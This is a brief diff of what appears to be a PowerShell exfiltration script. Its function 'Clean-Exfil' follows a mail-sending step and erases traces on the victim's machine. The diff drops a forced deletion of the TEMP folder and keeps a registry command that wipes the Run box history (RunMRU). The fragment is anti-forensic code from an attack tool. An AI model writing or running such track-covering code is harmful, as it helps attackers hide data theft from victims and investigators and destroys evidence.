@@ -17,8 +17,6 @@ Send-MailMessage @sendMailMessageSplat
 function Clean-Exfil { 
     Write-Output "Limpando arquivos temporários e histórico..."
 
-    # Empty temp folder
-    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 
     # Delete Run box history
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
